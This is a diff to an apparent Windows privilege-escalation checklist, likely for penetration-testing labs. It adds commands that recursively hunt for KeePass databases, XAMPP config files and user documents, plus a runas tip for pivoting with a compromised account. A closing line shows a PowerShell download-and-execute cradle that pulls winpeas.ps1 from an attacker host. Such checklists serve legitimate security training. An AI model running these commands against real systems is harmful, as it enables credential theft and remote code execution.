@@ -18,7 +18,7 @@ whoami /groups
 ## Existing users and groups
 ### Enumerating Users
 ```batch
-net user
+net user $USER
 ```
 ```
 <insert output here>
@@ -113,7 +113,35 @@ Get-Process
 ```
 <insert output here>
 ```
+### Enumerate filesystem for sensitive details
+#### Enumerate for password manager databases (i.e. .kbdx)
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+```
+<insert output here>
+```
+#### Enumerate application filesystem for interesting files (i.e. XAMPP)
+```powershell
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+```
+```
+<insert output here>
+```
+#### Enumerate home directory for interesting files
+```powershell
+Get-ChildItem -Path $env:userprofile -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+```
+<insert output here>
+```
+# No GUI?
+If a compromised user isn't part of "Remote Desktop Users" or "Remote Management Users", this means RDP access can't be gained.
 
+Instead, use runas on an account with GUI access to run a cmd or powershell:
+```powershell
+runas /user:$USER cmd
+```
 # Winpeas
 ```powershell
 powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
